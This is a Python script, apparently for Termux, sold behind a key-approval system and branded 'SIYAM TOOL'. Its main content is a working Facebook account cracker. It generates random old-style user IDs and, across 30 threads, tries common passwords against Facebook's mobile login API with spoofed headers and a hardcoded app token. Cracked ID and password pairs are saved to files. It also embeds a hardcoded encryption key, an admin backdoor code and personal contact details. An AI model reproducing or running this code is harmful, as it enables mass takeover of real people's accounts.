# -*- coding: utf-8 -*-
import os
import re
import time
import uuid
import hashlib
import random
import string
import requests
import sys
import json
import urllib
import urllib.request
import platform
import subprocess
from bs4 import BeautifulSoup
from random import randint as rr
from concurrent.futures import ThreadPoolExecutor as tred
from datetime import datetime, date, timedelta
from cryptography.fernet import Fernet  # 🔥 এনক্রিপশনের জন্য

# ========== এনক্রিপশন কনফিগার ==========
# 🔥 এখানে আপনার জেনারেট করা কী বসান
SECRET_KEY = b'41EO8mHDgVMVPdE6vOqSKWC-O6I9v-TrwZkL9exJrlU='

def encrypt_keys(keys):
    """JSON keys কে এনক্রিপ্ট করে"""
    f = Fernet(SECRET_KEY)
    return f.encrypt(json.dumps(keys).encode())

def decrypt_keys(encrypted):
    """এনক্রিপ্টেড keys কে ডিক্রিপ্ট করে"""
    f = Fernet(SECRET_KEY)
    return json.loads(f.decrypt(encrypted).decode())

# ========== GitHub কনফিগার ==========
GITHUB_REPO_PATH = os.path.expanduser("~/Siyam-Tool")
GITHUB_KEYS_FILE = os.path.join(GITHUB_REPO_PATH, "approved_keys.enc")  # 🔥 .enc এক্সটেনশন

# ========== প্ল্যাটফর্ম ডিটেক্ট ==========
SYSTEM = platform.system()
IS_ANDROID = (SYSTEM == "Android")
IS_IOS = (SYSTEM == "Darwin")

# ========== রং এর কোড ==========
if IS_ANDROID:
    R = '\033[1;31m'
    G = '\033[1;32m'
    Y = '\033[1;33m'
    B = '\033[1;34m'
    P = '\033[1;35m'
    C = '\033[1;36m'
    W = '\033[1;37m'
    RESET = '\033[0m'
else:
    R = G = Y = B = P = C = W = RESET = ""

# ========== ফাইল পাথ ==========
def get_base_path():
    if IS_ANDROID:
        return "/sdcard/"
    else:
        return os.path.expanduser("~/")

BASE_PATH = get_base_path()
KEY_FILE = os.path.join(BASE_PATH, "approved_keys.enc")  # 🔥 এনক্রিপ্টেড ফাইল
USER_KEY_FILE = os.path.join(BASE_PATH, "siyam_user_key.txt")
OK_FILE_1 = os.path.join(BASE_PATH, "SIYAM-OLD-M1-OK.txt")
OK_FILE_2 = os.path.join(BASE_PATH, "SIYAM-OLD-M2-OK.txt")

# ========== GitHub সিঙ্ক ফাংশন ==========
def pull_from_github():
    """GitHub থেকে এনক্রিপ্টেড keys ডাউনলোড করে"""
    try:
        if not os.path.exists(GITHUB_REPO_PATH):
            print(f"{Y}[!]{RESET} Cloning repository...")
            subprocess.run(["git", "clone", "https://github.com/Siyamahmed1122/Siyam-Tool.git", GITHUB_REPO_PATH], check=True)
        
        os.chdir(GITHUB_REPO_PATH)
        subprocess.run(["git", "pull", "origin", "main"], check=True, capture_output=True)
        
        if os.path.exists(GITHUB_KEYS_FILE):
            subprocess.run(["cp", GITHUB_KEYS_FILE, KEY_FILE], check=True)
            print(f"{G}[✓]{RESET} Keys synced from GitHub!")
            return True
        else:
            print(f"{Y}[!]{RESET} No encrypted keys file found, creating new...")
            return False
    except Exception as e:
        print(f"{R}[!]{RESET} GitHub pull failed: {e}")
        return False

def push_to_github():
    """এনক্রিপ্টেড keys GitHub এ push করে"""
    try:
        os.chdir(GITHUB_REPO_PATH)
        
        # লোকাল এনক্রিপ্টেড ফাইল কপি করে রেপোতে
        if os.path.exists(KEY_FILE):
            subprocess.run(["cp", KEY_FILE, GITHUB_KEYS_FILE], check=True)
        else:
            print(f"{R}[!]{RESET} Key file not found!")
            return
        
        # Git কনফিগার
        subprocess.run(["git", "config", "user.name", "Siyamahmed1122"], capture_output=True)
        subprocess.run(["git", "config", "user.email", "mdsiyammadbor@gmail.com"], capture_output=True)
        
        # ফাইল যোগ
        subprocess.run(["git", "add", "approved_keys.enc"], check=True, capture_output=True)
        
        # কমিট
        result = subprocess.run(["git", "commit", "-m", "Auto-update encrypted keys"], capture_output=True)
        
        if result.returncode == 0:
            subprocess.run(["git", "push", "origin", "main"], check=True, capture_output=True)
            print(f"{G}[✓]{RESET} Encrypted keys pushed to GitHub!")
        else:
            if "nothing to commit" in result.stderr.decode():
                print(f"{Y}[i]{RESET} No changes to push.")
            else:
                print(f"{R}[!]{RESET} Commit failed: {result.stderr.decode()}")
    except Exception as e:
        print(f"{R}[!]{RESET} GitHub push error: {e}")

# ========== ভয়েস ফাংশন ==========
def speak(message):
    if IS_ANDROID:
        os.system(f'espeak "{message}" 2>/dev/null')
    elif IS_IOS:
        try:
            os.system(f'say "{message}" 2>/dev/null')
        except:
            print(f"{Y}[Voice]{RESET} {message}")
    else:
        print(f"{Y}[Voice]{RESET} {message}")

# ========== লিংক ওপেন ফাংশন ==========
def open_admin_contact(admin_link, admin_number, user_key):
    if IS_ANDROID:
        os.system(f'termux-open-url "{admin_link}" 2>/dev/null')
        print(f"\n{' ' * 8}{G}[+]{RESET} Opening WhatsApp...")
        return True
    else:
        print(f"\n{' ' * 8}{Y}[!]{RESET} iPhone User - Manual Steps:")
        print(f"\n{' ' * 8}{G}[+]{RESET} Step 1: Copy this key: {C}{user_key}{RESET}")
        print(f"{' ' * 8}{G}[+]{RESET} Step 2: Open WhatsApp")
        print(f"{' ' * 8}{G}[+]{RESET} Step 3: Send key to: {C}{admin_number}{RESET}")
        print(f"{' ' * 8}{G}[+]{RESET} Step 4: Or use link: {C}{admin_link}{RESET}")
        return False

# ========== প্রিন্ট ফাংশন ==========
def print_line():
    print(f"{C}{'=' * 50}{RESET}")

def print_box(text, color=G):
    width = 50
    spaces = (width - len(text)) // 2
    print(f"{C}{'=' * width}{RESET}")
    print(f"{' ' * spaces}{color}{text}{RESET}")
    print(f"{C}{'=' * width}{RESET}")

# ========== ব্যানার ==========
def banner():
    os.system("clear")
    print(f"{G}")
    print("    ███████╗██╗██╗   ██╗ █████╗ ███╗   ███╗")
    print("    ██╔════╝██║╚██╗ ██╔╝██╔══██╗████╗ ████║")
    print("    ███████╗██║ ╚████╔╝ ███████║██╔████╔██║")
    print("    ╚════██║██║  ╚██╔╝  ██╔══██║██║╚██╔╝██║")
    print("    ███████║██║   ██║   ██║  ██║██║ ╚═╝ ██║")
    print("    ╚══════╝╚═╝   ╚═╝   ╚═╝  ╚═╝╚═╝     ╚═╝")
    print(f"{RESET}")

# ========== JSON ফাংশন (এনক্রিপ্টেড) ==========
def load_approved_keys():
    try:
        with open(KEY_FILE, "rb") as f:
            encrypted = f.read()
        keys = decrypt_keys(encrypted)
        # পুরনো ফরম্যাট কনভার্ট
        new_keys = []
        for item in keys:
            if isinstance(item, str):
                new_keys.append({"key": item, "expiry": "unlimited"})
            else:
                new_keys.append(item)
        if new_keys != keys:
            save_approved_keys(new_keys)
        return new_keys
    except Exception as e:
        print(f"{Y}[!]{RESET} No valid key file found, creating default...")
        default_keys = [{"key": "SIYAM-MAHMUD-2022", "expiry": "unlimited"}]
        save_approved_keys(default_keys)
        return default_keys

def save_approved_keys(keys):
    encrypted = encrypt_keys(keys)
    with open(KEY_FILE, "wb") as f:
        f.write(encrypted)

def add_new_key(new_key, expiry_days=None):
    keys = load_approved_keys()
    for item in keys:
        if item["key"] == new_key:
            print(f"{R}[-]{RESET} Already exists: {new_key}")
            return False
    if expiry_days == "unlimited" or expiry_days is None:
        expiry = "unlimited"
    else:
        expiry_date = date.today() + timedelta(days=int(expiry_days))
        expiry = expiry_date.strftime("%Y-%m-%d")
    keys.append({"key": new_key, "expiry": expiry})
    save_approved_keys(keys)
    push_to_github()  # 🔥 Auto-push to GitHub
    print(f"{G}[+]{RESET} Added: {new_key} ({Y}Expires: {expiry}{RESET})")
    return True

def remove_key_by_index(index):
    keys = load_approved_keys()
    if 1 <= index <= len(keys):
        removed = keys.pop(index - 1)
        save_approved_keys(keys)
        push_to_github()  # 🔥 Auto-push to GitHub
        print(f"{G}[+]{RESET} Deleted: {removed['key']}")
        return True
    else:
        print(f"{R}[-]{RESET} Invalid index! Choose 1-{len(keys)}")
        return False

def is_key_valid(user_key):
    keys = load_approved_keys()
    for item in keys:
        if item["key"] == user_key:
            if item["expiry"] == "unlimited":
                return True
            else:
                expiry_date = datetime.strptime(item["expiry"], "%Y-%m-%d").date()
                if date.today() <= expiry_date:
                    return True
                else:
                    print(f"{R}[!]{RESET} Key expired on {item['expiry']}")
                    return False
    return False

def show_all_keys():
    keys = load_approved_keys()
    print(f"\n{C}{'=' * 60}{RESET}")
    print(f"{C}{' ' * 22}ALL KEYS{RESET}")
    print(f"{C}{'=' * 60}{RESET}")
    if not keys:
        print(f"{Y}{' ' * 20}No keys found!{RESET}")
    else:
        for i, item in enumerate(keys, 1):
            if item["expiry"] == "unlimited":
                expiry_show = f"{G}unlimited{RESET}"
            else:
                expiry_show = f"{Y}Expires: {item['expiry']}{RESET}"
            print(f"{' ' * 10}{i}. {C}{item['key']}{RESET} - {expiry_show}")
    print(f"{C}{'=' * 60}{RESET}")

# ========== ইউজার কী ফাংশন ==========
def generate_user_key():
    return f"SIYAM-{random.randint(100000, 999999)}"

def save_user_key(key):
    with open(USER_KEY_FILE, "w") as f:
        f.write(key)

def get_user_key():
    try:
        with open(USER_KEY_FILE, "r") as f:
            return f.read().strip()
    except:
        new_key = generate_user_key()
        save_user_key(new_key)
        return new_key

# ========== রিনিউ ফাংশন ==========
def renew_key():
    keys = load_approved_keys()
    print(f"\n{C}{'=' * 60}{RESET}")
    print(f"{C}{' ' * 22}RENEW KEY{RESET}")
    print(f"{C}{'=' * 60}{RESET}")
    if not keys:
        print(f"{Y}{' ' * 20}No keys found!{RESET}")
        return
    for i, item in enumerate(keys, 1):
        if item["expiry"] == "unlimited":
            expiry_show = f"{G}unlimited{RESET}"
        else:
            expiry_show = f"{Y}Expires: {item['expiry']}{RESET}"
        print(f"{' ' * 10}{i}. {C}{item['key']}{RESET} - {expiry_show}")
    print(f"{C}{'=' * 60}{RESET}")
    try:
        idx = int(input(f"{G}>>>{RESET} Enter key number to renew: "))
        if 1 <= idx <= len(keys):
            key_to_renew = keys[idx - 1]
            if key_to_renew["expiry"] == "unlimited":
                print(f"{R}[-]{RESET} Unlimited key cannot be renewed!")
                return
            print(f"\n{Y}[!]{RESET} Current expiry: {key_to_renew['expiry']}")
            print(f"{G}[!]{RESET} Today's date: {date.today()}")
            print(f"\n{G}How many days to add?{RESET}")
            print(f"{C}   7 days = 1 week{RESET}")
            print(f"{C}   30 days = 1 month{RESET}")
            print(f"{C}   60 days = 2 months{RESET}")
            print(f"{C}   90 days = 3 months{RESET}")
            print(f"{C}   365 days = 1 year{RESET}")
            extra_days = input(f"{G}>>>{RESET} Enter days: ")
            old_expiry = datetime.strptime(key_to_renew["expiry"], "%Y-%m-%d").date()
            new_expiry = old_expiry + timedelta(days=int(extra_days))
            print(f"\n{Y}[!]{RESET} Old expiry: {key_to_renew['expiry']}")
            print(f"{G}[+]{RESET} New expiry: {new_expiry}")
            confirm = input(f"{Y}Confirm renew? (y/n): {RESET}").lower()
            if confirm == 'y':
                for item in keys:
                    if item["key"] == key_to_renew["key"]:
                        item["expiry"] = new_expiry.strftime("%Y-%m-%d")
                        break
                save_approved_keys(keys)
                push_to_github()
                print(f"\n{G}{'=' * 60}{RESET}")
                print(f"{G}[✓]{RESET} Key renewed successfully!")
                print(f"{G}[+]{RESET} Key: {key_to_renew['key']}")
                print(f"{G}[+]{RESET} New expiry: {new_expiry}")
                print(f"{G}{'=' * 60}{RESET}")
                speak(f"Key renewed successfully")
            else:
                print(f"{R}[-]{RESET} Renew cancelled!")
        else:
            print(f"{R}[-]{RESET} Invalid key number!")
    except ValueError:
        print(f"{R}[-]{RESET} Invalid input!")
    input(f"\n{Y}[Press ENTER to continue...]{RESET}")

# ========== অ্যাডমিন প্যানেল ==========
def admin_panel():
    while True:
        os.system("clear")
        print(f"{C}{'=' * 60}{RESET}")
        print(f"{C}{' ' * 22}👑 ADMIN PANEL 👑{RESET}")
        print(f"{C}{'=' * 60}{RESET}")
        print(f"\n{G}{' ' * 15}1. Add New Key (With Days){RESET}")
        print(f"{G}{' ' * 15}2. Add Unlimited Key{RESET}")
        print(f"{Y}{' ' * 15}3. Renew Existing Key{RESET}")
        print(f"{R}{' ' * 15}4. Delete Key (By Number){RESET}")
        print(f"{C}{' ' * 15}5. Show All Keys{RESET}")
        print(f"{B}{' ' * 15}6. Back to Main Menu{RESET}\n")
        print(f"{C}{'=' * 60}{RESET}")
        choice = input(f"{G}>>>{RESET} Choose (1-6): ")
        
        if choice == "1":
            new_key = input(f"{Y}Enter new key:{RESET} ").strip().upper()
            days = input(f"{Y}Enter days (7, 30, 60, 90, 365):{RESET} ")
            add_new_key(new_key, days)
        elif choice == "2":
            new_key = input(f"{Y}Enter new key:{RESET} ").strip().upper()
            add_new_key(new_key, "unlimited")
        elif choice == "3":
            renew_key()
        elif choice == "4":
            show_all_keys()
            try:
                idx = int(input(f"{R}Enter number to delete:{RESET} "))
                remove_key_by_index(idx)
            except ValueError:
                print(f"{R}[-]{RESET} Invalid input!")
        elif choice == "5":
            show_all_keys()
        elif choice == "6":
            print(f"{G}[+]{RESET} Going back...")
            return
        else:
            print(f"{R}[-]{RESET} Wrong choice!")
        input(f"\n{Y}[Press ENTER]{RESET}")

# ========== FACEBOOK TOOL CODE ==========

method = []
oks = []
cps = []
loop = 0
user = []

X = '\x1b[1;37m'
rad = '\x1b[38;5;196m'
G2 = '\x1b[38;5;46m'
Y2 = '\x1b[38;5;220m'
PP = '\x1b[38;5;203m'
RR = '\x1b[38;5;196m'
GS = '\x1b[38;5;40m'
W2 = '\x1b[1;37m'

def windows():
    aV = str(random.choice(range(10, 20)))
    A = f"Mozilla/5.0 (Windows; U; Windows NT {str(random.choice(range(5, 7)))}.1; en-US) AppleWebKit/534.{aV} (KHTML, like Gecko) Chrome/{str(random.choice(range(8, 12)))}.0.{str(random.choice(range(552, 661)))}.0 Safari/534.{aV}"
    bV = str(random.choice(range(1, 36)))
    bx = str(random.choice(range(34, 38)))
    bz = f'5{bx}.{bV}'
    B = f"Mozilla/5.0 (Windows NT {str(random.choice(range(5, 7)))}.{str(random.choice(['2', '1']))}) AppleWebKit/{bz} (KHTML, like Gecko) Chrome/{str(random.choice(range(12, 42)))}.0.{str(random.choice(range(742, 2200)))}.{str(random.choice(range(1, 120)))} Safari/{bz}"
    cV = str(random.choice(range(1, 36)))
    cx = str(random.choice(range(34, 38)))
    cz = f'5{cx}.{cV}'
    C2 = f"Mozilla/5.0 (Windows NT 6.{str(random.choice(['2', '1']))}; WOW64) AppleWebKit/{cz} (KHTML, like Gecko) Chrome/{str(random.choice(range(12, 42)))}.0.{str(random.choice(range(742, 2200)))}.{str(random.choice(range(1, 120)))} Safari/{cz}"
    D = f"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.{str(random.choice(range(1, 7120)))}.0 Safari/537.36"
    return random.choice([A, B, C2, D])

def window1():
    aV = str(random.choice(range(10, 20)))
    A = f"Mozilla/5.0 (Windows; U; Windows NT {random.choice(range(6, 11))}.0; en-US) AppleWebKit/534.{aV} (KHTML, like Gecko) Chrome/{random.choice(range(80, 122))}.0.{random.choice(range(4000, 7000))}.0 Safari/534.{aV}"
    bV = str(random.choice(range(1, 36)))
    bx = str(random.choice(range(34, 38)))
    bz = f'5{bx}.{bV}'
    B = f"Mozilla/5.0 (Windows NT {random.choice(range(6, 11))}.{random.choice(['0', '1'])}) AppleWebKit/{bz} (KHTML, like Gecko) Chrome/{random.choice(range(80, 122))}.0.{random.choice(range(4000, 7000))}.{random.choice(range(50, 200))} Safari/{bz}"
    cV = str(random.choice(range(1, 36)))
    cx = str(random.choice(range(34, 38)))
    cz = f'5{cx}.{cV}'
    C2 = f"Mozilla/5.0 (Windows NT 6.{random.choice(['0', '1', '2'])}; WOW64) AppleWebKit/{cz} (KHTML, like Gecko) Chrome/{random.choice(range(80, 122))}.0.{random.choice(range(4000, 7000))}.{random.choice(range(50, 200))} Safari/{cz}"
    latest_build = rr(6000, 9000)
    latest_patch = rr(100, 200)
    D = f"Mozilla/5.0 (Windows NT {random.choice(['10.0', '11.0'])}; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.{latest_build}.{latest_patch} Safari/537.36"
    return random.choice([A, B, C2, D])

def creationyear(uid):
    if len(uid) == 15:
        if uid.startswith('1000000000'):
            return '2009'
        if uid.startswith('100000000'):
            return '2009'
        if uid.startswith('10000000'):
            return '2009'
        if uid.startswith(('1000000', '1000001', '1000002', '1000003', '1000004', '1000005')):
            return '2009'
        if uid.startswith(('1000006', '1000007', '1000008', '1000009')):
            return '2010'
        if uid.startswith('100001'):
            return '2010'
        if uid.startswith(('100002', '100003')):
            return '2011'
        if uid.startswith('100004'):
            return '2012'
        if uid.startswith(('100005', '100006')):
            return '2013'
        if uid.startswith(('100007', '100008')):
            return '2014'
        if uid.startswith('100009'):
            return '2015'
        if uid.startswith('10001'):
            return '2016'
        if uid.startswith('10002'):
            return '2017'
        if uid.startswith('10003'):
            return '2018'
        if uid.startswith('10004'):
            return '2019'
        if uid.startswith('10005'):
            return '2020'
        if uid.startswith('10006'):
            return '2021'
        if uid.startswith('10009'):
            return '2023'
        if uid.startswith(('10007', '10008')):
            return '2022'
        return ''
    elif len(uid) in (9, 10):
        return '2008'
    elif len(uid) == 8:
        return '2007'
    elif len(uid) == 7:
        return '2006'
    elif len(uid) == 14 and uid.startswith('61'):
        return '2024'
    else:
        return ''

def linex():
    print('\x1b[38;5;48m====================================')

def BNG_71_():
    banner()
    print('       (A) OLD CLONE')
    linex()
    choice = input("CHOICE: ")
    if choice.upper() in ('A', '01', '1'):
        old_clone()
    else:
        print(f"\n[!] Choose Valid Option...")
        time.sleep(2)
        BNG_71_()

def old_clone():
    banner()
    print('       (A) ALL SERIES')
    linex()
    print('       (B) 100003/4 SERIES')
    linex()
    print('       (C) 2009 series')
    linex()
    _input = input("CHOICE: ")
    if _input.upper() in ('A', '01', '1'):
        old_One()
    elif _input.upper() in ('B', '02', '2'):
        old_Tow()
    elif _input.upper() in ('C', '03', '3'):
        old_Tree()
    else:
        print(f"\n[!] Choose Valid Option...")
        BNG_71_()

def old_One():
    user = []
    banner()
    print("Old Code: 2010-2014")
    ask = input("SELECT: ")
    linex()
    banner()
    print("EXAMPLE: 20000 / 30000 / 99999")
    limit = input("SELECT: ")
    linex()
    star = '10000'
    for _ in range(int(limit)):
        data = str(random.choice(range(1000000000, 1999999999 if ask == '1' else 4999999999)))
        user.append(data)
    print('        METHOD 1')
    print('        METHOD 2')
    linex()
    meth = input("CHOICE (A/B): ").strip().upper()
    with tred(max_workers=30) as pool:
        banner()
        print(f"TOTAL ID FROM CRACK: {limit}")
        print("USE AIRPLANE MOD FOR GOOD RESULT")
        linex()
        for mal in user:
            uid = star + mal
            if meth == 'A':
                pool.submit(login_1, uid)
            elif meth == 'B':
                pool.submit(login_2, uid)

def old_Tow():
    user = []
    banner()
    print("OLD CODE: 2010-2014")
    ask = input("SELECT: ")
    linex()
    banner()
    print("EXAMPLE: 20000 / 30000 / 99999")
    limit = input("SELECT: ")
    linex()
    prefixes = ['100003', '100004']
    for _ in range(int(limit)):
        prefix = random.choice(prefixes)
        suffix = ''.join(random.choices('0123456789', k=9))
        uid = prefix + suffix
        user.append(uid)
    print('METHOD A')
    print('METHOD B')
    linex()
    meth = input("CHOICE (A/B): ").strip().upper()
    with tred(max_workers=30) as pool:
        banner()
        print(f"TOTAL ID FROM CRACK: {limit}")
        print("USE AIRPLANE MOD FOR GOOD RESULT")
        linex()
        for uid in user:
            if meth == 'A':
                pool.submit(login_1, uid)
            elif meth == 'B':
                pool.submit(login_2, uid)

def old_Tree():
    user = []
    banner()
    print("OLD CODE: 2009-2010")
    ask = input("SELECT: ")
    linex()
    banner()
    print("EXAMPLE: 20000 / 30000 / 99999")
    limit = input("TOTAL ID COUNT: ")
    linex()
    prefix = '1000004'
    for _ in range(int(limit)):
        suffix = ''.join(random.choices('0123456789', k=8))
        uid = prefix + suffix
        user.append(uid)
    print('METHOD A')
    print('Method B')
    linex()
    meth = input("CHOICE (A/B): ").strip().upper()
    with tred(max_workers=30) as pool:
        banner()
        print(f"TOTAL ID FROM CRACK: {limit}")
        print("USE AIRPLANE MOD FOR GOOD RESULT")
        linex()
        for uid in user:
            if meth == 'A':
                pool.submit(login_1, uid)
            elif meth == 'B':
                pool.submit(login_2, uid)

def login_1(uid):
    global loop
    session = requests.session()
    try:
        for pw in ('123456', '1234567', '12345678', '123456789'):
            data = {
                'adid': str(uuid.uuid4()),
                'format': 'json',
                'device_id': str(uuid.uuid4()),
                'cpl': 'true',
                'family_device_id': str(uuid.uuid4()),
                'credentials_type': 'device_based_login_password',
                'error_detail_type': 'button_with_disabled',
                'source': 'device_based_login',
                'email': str(uid),
                'password': str(pw),
                'access_token': '350685531728|62f8ce9f74b12f84c123cc23437a4a32',
                'generate_session_cookies': '1',
                'meta_inf_fbmeta': '',
                'advertiser_id': str(uuid.uuid4()),
                'currently_logged_in_userid': '0',
                'locale': 'en_US',
                'client_country_code': 'US',
                'method': 'auth.login',
                'fb_api_req_friendly_name': 'authenticate',
                'fb_api_caller_class': 'com.facebook.account.login.protocol.Fb4aAuthHandler',
                'api_key': '882a8490361da98702bf97a021ddc14d'
            }
            headers = {
                'User-Agent': window1(),
                'Content-Type': 'application/x-www-form-urlencoded',
                'Host': 'graph.facebook.com',
                'X-FB-Net-HNI': '25227',
                'X-FB-SIM-HNI': '29752',
                'X-FB-Connection-Type': 'MOBILE.LTE',
                'X-Tigon-Is-Retry': 'False',
                'x-fb-session-id': 'nid=jiZ+yNNBgbwC;pid=Main;tid=132;',
                'x-fb-device-group': '5120',
                'X-FB-Friendly-Name': 'ViewerReactionsMutation',
                'X-FB-Request-Analytics-Tags': 'graphservice',
                'X-FB-HTTP-Engine': 'Liger',
                'X-FB-Client-IP': 'True',
                'X-FB-Server-Cluster': 'True',
                'x-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62'
            }
            res = session.post('https://b-graph.facebook.com/auth/login', data=data, headers=headers, allow_redirects=False).json()
            
            if 'session_key' in res:
                speak("Valid Id Found Tomorrow Login")
                profile_link = f"https://facebook.com/{uid}"
                
                print(f"\n{'='*50}")
                print(f"[+] UID       : {uid}")
                print(f"[+] PASSWORD  : {pw}")
                print(f"[+] CREATED   : {creationyear(uid)}")
                print(f"[+] PROFILE   : {profile_link}")
                print(f"{'='*50}\n")
                
                open('/sdcard/SIYAM-OLD-M1-OK.txt', 'a').write(f"{uid}|{pw}|{creationyear(uid)}|{profile_link}\n")
                oks.append(uid)
                break
                
            elif 'www.facebook.com' in str(res.get('error', {}).get('message', '')):
                speak("Valid Id Found Tomorrow Login")
                profile_link = f"https://facebook.com/{uid}"
                
                print(f"\n{'='*50}")
                print(f"[+] UID       : {uid}")
                print(f"[+] PASSWORD  : {pw}")
                print(f"[+] CREATED   : {creationyear(uid)}")
                print(f"[+] PROFILE   : {profile_link}")
                print(f"{'='*50}\n")
                
                open('/sdcard/SIYAM-OLD-M1-OK.txt', 'a').write(f"{uid}|{pw}|{creationyear(uid)}|{profile_link}\n")
                oks.append(uid)
                break
                
        loop += 1
    except Exception:
        time.sleep(5)
    
    sys.stdout.write(f"\r[SIYAM-M1] LOOP:{loop} OK:{len(oks)}")
    sys.stdout.flush()

def login_2(uid):
    global loop
    
    for pw in ('123456', '123123', '1234567', '12345678', '123456789'):
        try:
            session = requests.session()
            data = {
                'adid': str(uuid.uuid4()),
                'format': 'json',
                'device_id': str(uuid.uuid4()),
                'cpl': 'true',
                'family_device_id': str(uuid.uuid4()),
                'credentials_type': 'device_based_login_password',
                'error_detail_type': 'button_with_disabled',
                'source': 'device_based_login',
                'email': str(uid),
                'password': str(pw),
                'access_token': '350685531728|62f8ce9f74b12f84c123cc23437a4a32',
                'generate_session_cookies': '1',
                'meta_inf_fbmeta': '',
                'advertiser_id': str(uuid.uuid4()),
                'currently_logged_in_userid': '0',
                'locale': 'en_US',
                'client_country_code': 'US',
                'method': 'auth.login',
                'fb_api_req_friendly_name': 'authenticate',
                'fb_api_caller_class': 'com.facebook.account.login.protocol.Fb4aAuthHandler',
                'api_key': '882a8490361da98702bf97a021ddc14d'
            }
            headers = {
                'User-Agent': window1(),
                'Content-Type': 'application/x-www-form-urlencoded',
                'Host': 'graph.facebook.com',
                'X-FB-Net-HNI': '25227',
                'X-FB-SIM-HNI': '29752',
                'X-FB-Connection-Type': 'MOBILE.LTE',
                'X-Tigon-Is-Retry': 'False',
                'x-fb-session-id': 'nid=jiZ+yNNBgbwC;pid=Main;tid=132;',
                'x-fb-device-group': '5120',
                'X-FB-Friendly-Name': 'ViewerReactionsMutation',
                'X-FB-Request-Analytics-Tags': 'graphservice',
                'X-FB-HTTP-Engine': 'Liger',
                'X-FB-Client-IP': 'True',
                'X-FB-Server-Cluster': 'True',
                'x-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62'
            }
            res = session.post('https://b-graph.facebook.com/auth/login', data=data, headers=headers, allow_redirects=False).json()
            
            if 'session_key' in res:
                speak("Valid Id Found Tomorrow Login")
                profile_link = f"https://facebook.com/{uid}"
                
                print(f"\n{'='*50}")
                print(f"[+] UID       : {uid}")
                print(f"[+] PASSWORD  : {pw}")
                print(f"[+] CREATED   : {creationyear(uid)}")
                print(f"[+] PROFILE   : {profile_link}")
                print(f"{'='*50}\n")
                
                open('/sdcard/SIYAM-OLD-M2-OK.txt', 'a').write(f"{uid}|{pw}|{creationyear(uid)}|{profile_link}\n")
                oks.append(uid)
                break
                
            elif 'www.facebook.com' in str(res.get('error', {}).get('message', '')):
                speak("Valid Id Found Tomorrow Login")
                profile_link = f"https://facebook.com/{uid}"
                
                print(f"\n{'='*50}")
                print(f"[+] UID       : {uid}")
                print(f"[+] PASSWORD  : {pw}")
                print(f"[+] CREATED   : {creationyear(uid)}")
                print(f"[+] PROFILE   : {profile_link}")
                print(f"{'='*50}\n")
                
                open('/sdcard/SIYAM-OLD-M2-OK.txt', 'a').write(f"{uid}|{pw}|{creationyear(uid)}|{profile_link}\n")
                oks.append(uid)
                break
                
        except Exception:
            pass
    
    loop += 1
    
    sys.stdout.write(f"\r[SIYAM-M2] LOOP:{loop} OK:{len(oks)}")
    sys.stdout.flush()

# ========== মেইন ফাংশন ==========
def main():
    # 🔥 GitHub থেকে সর্বশেষ এনক্রিপ্টেড keys সিঙ্ক করবে
    pull_from_github()
    
    ADMIN_LINK = "https://wa.me/message/5D3OD2FT3EYVJ1"
    ADMIN_NUMBER = "+60167442160"
    
    while True:
        banner()
        print_line()
        print(f"{' ' * 15}{Y}🔐 SIYAM TOOL 🔐{RESET}")
        print_line()
        print()
        print(f"{' ' * 15}{C}[ 👑 SIYAM MAHMUD 👑 ]{RESET}")
        print()
        print(f"{' ' * 15}{R}[ APPROVAL SYSTEM 🛡️♻️🔑]{RESET}")
        print()
        
        speak("Assalamu Walaikum Welcome to Siyam tool")
        
        master = input(f"{W}[?]{RESET} {R}Press Enter Get Key{RESET} / {G}Run:{RESET} ")
        
        if master.upper() == "ADMIN01":
            admin_panel()
            continue
        
        user_key = get_user_key()
        
        if is_key_valid(user_key):
            speak("Welcome back!")
            print_line()
            print(f"{' ' * 10}{G}[✓]{RESET} Already approved! Tool is running!")
            print(f"{' ' * 15}{G}>>> TOOL UNLOCKED <<<{RESET}")
            print_line()
            BNG_71_()  
            return
        
        print()
        print_line()
        print(f"{' ' * 15}{Y}YOUR UNIQUE KEY{RESET}")
        print_line()
        print(f"{' ' * 13}{W}[?]{RESET} {B}How to Get Access{RESET}")
        print(f"{' ' * 13}{W}[*]{RESET} {R}Copy Your Key{RESET}")
        print(f"{' ' * 13}{W}[*]{RESET} {G}Send to Admin{RESET}")
        print_line()
        print(f"{' ' * 18}{R}Your Key 🔑 {user_key}{RESET}")
        print_line()
        
        speak("Please copy your key and send it to admin")
        
        if IS_ANDROID:
            input(f"\n{' ' * 8}{Y}[Press ENTER after copying the key...]{RESET}")
            print(f"\n{' ' * 8}{G}[+]{RESET} Opening WhatsApp...")
            os.system(f'termux-open-url "{ADMIN_LINK}" 2>/dev/null')
            input(f"\n{' ' * 8}{Y}[Press ENTER after sending key to admin...]{RESET}")
        else:
            print(f"\n{' ' * 8}{Y}[!] Manual Steps Required{RESET}")
            print(f"\n{' ' * 8}{G}[+]{RESET} Key: {C}{user_key}{RESET}")
            print(f"{' ' * 8}{G}[+]{RESET} Send to: {C}{ADMIN_NUMBER}{RESET}")
            print(f"{' ' * 8}{G}[+]{RESET} Link: {C}{ADMIN_LINK}{RESET}")
            input(f"\n{' ' * 8}{Y}[Press ENTER after sending key...]{RESET}")
        
        if is_key_valid(user_key):
            speak("Access successful. Welcome To Siyam Tool.")
            print_line()
            print(f"{' ' * 10}{G}[✓]{RESET} Key approved!")
            print(f"{' ' * 12}{G}>>> TOOL UNLOCKED <<<{RESET}")
            print_line()
            BNG_71_()
            return
        else:
            speak("Access denied. Key not approved.")
            print_line()
            print(f"{' ' * 13}{R}[!]{RESET} Key not approved!")
            print(f"{' ' * 10}{Y}[!]{RESET} Send this key: {user_key}")
            print_line()
            input(f"\n{' ' * 8}{Y}Press ENTER to continue...{RESET}")

if __name__ == "__main__":
    main()
